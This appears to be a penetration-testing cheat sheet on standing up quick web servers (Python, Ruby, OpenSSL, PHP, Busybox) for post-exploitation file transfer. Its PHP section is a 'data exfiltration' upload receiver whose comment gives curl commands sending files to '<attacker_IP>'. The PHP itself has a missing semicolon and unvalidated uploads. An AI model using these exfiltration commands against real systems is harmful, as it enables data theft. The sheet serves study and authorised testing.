# Setup

Search Tag(s): #post-exploitation #file-transfer-and-data-exfiltration #living-off-the-land #linux

## 01 - Python

Note: by default it runs the service with port 8000 if it is not specified

```
$ sudo python2 -m SimpleHTTPServer 80

$ sudo python3 -m http.server 80
```

## 02 - Ruby

Note: you'll need to install webrick for ruby (by default it'll use port 8080 if port is not specified)

To install the ruby gem:

```
$ gem install webrick
```

To install in Debian/Ubuntu

```
$ sudo apt install ruby-webrick
```

Host a webserver via Ruby

```
$ sudo ruby -run -ehttpd . -p 80
```

## 03 - OpenSSL

Generate self-signed **certificate** (`.crt`) and **private key** (`.key`).

```
$ openssl req -x509 -nodes -days 365 -newkey rsa:4096 -keyout private.key -out certificate.crt
```

Start an encrypted web server. The default port is 4433.

```
$ openssl s_server -cert certificate.crt -accept <PORT> -WWW
```

## 04 - PHP

Data exfiltration server side.

```php
<?php
/*
$ sudo mkdir -p /var/www/html/uploads/ && \
sudo chown www-data:www-data /var/www/html/

$ curl <-F | --form> fileToUpload=@file.txt http[s]://<attacker_IP>/upload.php

$ curl <-T | --upload-file> fileToUpload=@file.txt http[s]://<attacker_IP>/upload.php
*/

$target_directory = "uploads/"
$target_file = $target_directory . basename($_FILES["fileToUpload"]["name"]);

echo "Source=" . $_FILES["fileToUpload"]["name"] . "<br/>";
echo "Target path=" . $target_directory . "<br/>";
echo "Size=" . $_FILES["fileToUpload"]["size"] . "<br/>";

if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "The file " . basename($_FILES["fileToUpload"]["name"]) . " has been uploaded";
} else {
    echo "There was an error uploading the file, please try again!";
}
?>


<!DOCTYPE html>
<html>
    <body>
        <form method="post" enctype="multipart/form-data">
            Select File to upload:
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" name="Upload">
        </form>
    </body>
</html>
```

To install in Debian/Ubuntu

```
$ sudo apt install apache2

$ sudo apt install nginx
```

Host a webserver via PHP

```
$ sudo php -S 0.0.0.0:80

$ sudo systemctl start apache2

$ sudo systemctl start nginx
```

## 05 - Busybox

```
$ busybox httpd -f -p <PORT> -h .
```